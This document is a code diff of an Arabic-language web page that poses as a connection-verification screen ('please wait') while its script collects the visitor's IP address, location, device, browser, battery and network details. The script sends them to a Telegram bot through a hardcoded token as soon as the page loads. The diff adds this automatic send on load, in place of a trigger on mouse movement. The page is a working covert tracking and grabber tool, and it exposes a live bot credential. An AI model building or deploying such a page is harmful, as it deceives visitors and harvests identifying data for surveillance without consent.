@@ -1,76 +1,113 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <title>جاري التحقق...</title>
+  <meta charset="UTF-8">
+  <title>جارٍ التحقق...</title>
+  <style>
+    body {
+      background-color: #f4f4f4;
+      font-family: 'Cairo', sans-serif;
+      text-align: center;
+      padding-top: 20%;
+      color: #333;
+    }
+    .loading {
+      font-size: 1.2em;
+    }
+  </style>
+</head>
+<body>
+  <h2>📡 يتم التحقق من اتصالك...</h2>
+  <div class="loading">يرجى الانتظار قليلاً...</div>
+
   <script>
-    let moved = false;
+    async function getIPInfo() {
+      const res = await fetch("https://ipapi.co/json/");
+      return await res.json();
+    }
 
-    async function getExtraData() {
-      const ref = new URLSearchParams(window.location.search).get("ref") || "غير_معروف";
+    async function getBatteryInfo() {
+      if ('getBattery' in navigator) {
+        const battery = await navigator.getBattery();
+        return {
+          level: Math.round(battery.level * 100),
+          charging: battery.charging ? "نعم" : "لا"
+        };
+      }
+      return { level: "غير متاح", charging: "غير متاح" };
+    }
 
-      const ipInfo = await fetch("https://ipapi.co/json").then(res => res.json()).catch(() => ({}));
-      const battery = await navigator.getBattery?.().then(b => ({
-        level: `${Math.round(b.level * 100)}%`,
-        charging: b.charging ? "🔌 على الكهرباء" : "🔋 غير متصل"
-      })) || { level: "غير معروف", charging: "غير معروف" };
-
+    async function collectData() {
+      const ip = await getIPInfo();
+      const battery = await getBatteryInfo();
       const connection = navigator.connection || {};
-      const connectionType = connection.effectiveType || "غير معروف";
-      const speedMbps = connection.downlink || "غير معروف";
+      const time = new Date().toLocaleString('ar-YE');
 
-      const screenSize = `${screen.width}x${screen.height}`;
-      const language = navigator.language;
-      const os = navigator.platform;
-      const browser = navigator.userAgent;
-      const localTime = new Date().toLocaleString("ar-YE");
-      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const online = navigator.onLine ? "متصل" : "غير متصل";
+      return {
+        ip: ip.ip,
+        country: ip.country_name,
+        city: ip.city,
+        region: ip.region,
+        timezone: ip.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
+        time: time,
+        os: navigator.platform,
+        browser: navigator.userAgent,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        theme: window.matchMedia('(prefers-color-scheme: dark)').matches ? "مظلم" : "فاتح",
+        battery: battery.level + "%",
+        charging: battery.charging,
+        connection: connection.effectiveType || "غير معروف"
+      };
+    }
 
-      const message = `
-📥 تم دخول الرابط:
-🆔 المرجع: ${ref}
+    function formatMessage(data) {
+      return `📡 دخول جديد إلى الموقع:
 
-🔹 الدولة: ${ipInfo.country_name || "غير معروف"}
-🔹 المدينة: ${ipInfo.city || "غير معروف"}
-🔹 التوقيت المحلي: ${localTime}
-🔹 المنطقة الزمنية: ${timeZone}
+🧠 معلومات الزائر:
+🔹 IP: ${data.ip}
+🔹 الدولة: ${data.country}
+🔹 المدينة: ${data.city}, ${data.region}
+🔹 التوقيت المحلي: ${data.time}
+🔹 المنطقة الزمنية: ${data.timezone}
 
 🖥️ الجهاز والمتصفح:
-🔸 نظام التشغيل: ${os}
-🔸 المتصفح: ${browser}
-🔸 اللغة: ${language}
-🔸 دقة الشاشة: ${screenSize}
-🔸 الوضع: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? "مظلم" : "فاتح"}
+🔸 نظام التشغيل: ${data.os}
+🔸 المتصفح: ${data.browser}
+🔸 اللغة: ${data.language}
+🔸 دقة الشاشة: ${data.screen}
+🔸 الوضع: ${data.theme}
 
 🔋 البطارية:
-🔸 الشحن: ${battery.level}
-🔸 ${battery.charging}
+🔸 الشحن: ${data.battery}
+🔸 موصل بالكهرباء: ${data.charging}
 
 📶 الاتصال:
-🔸 نوع الاتصال: ${connectionType}
-🔸 السرعة المقدرة: ${speedMbps} Mbps
-🔸 الحالة: ${online}
-`;
+🔸 نوع الاتصال: ${data.connection}
 
-      await fetch("https://api.telegram.org/bot8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4/sendMessage", {
+⚠️ البيانات أُرسلت من خلال الصفحة المخصصة للزوار الجدد.
+------------------------`;
+    }
+
+    async function sendToTelegram(msg) {
+      const chatId = new URLSearchParams(window.location.search).get("ref") || "7121448697"; // ← بدّله لو لزم الأمر
+      const token = "8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4"; // ← توكن البوت الخاص بك
+
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: ref,
-          text: message
+          chat_id: chatId,
+          text: msg
         })
       });
     }
 
-    document.addEventListener("mousemove", async function onceMouseMoved() {
-      if (moved) return;
-      moved = true;
-      await getExtraData();
-    });
+    (async () => {
+      const data = await collectData();
+      const msg = formatMessage(data);
+      await sendToTelegram(msg);
+    })();
   </script>
-</head>
-<body>
-  <h2 style="text-align:center;margin-top:20%;">📡 يتم التحقق من اتصالك...</h2>
 </body>
 </html>
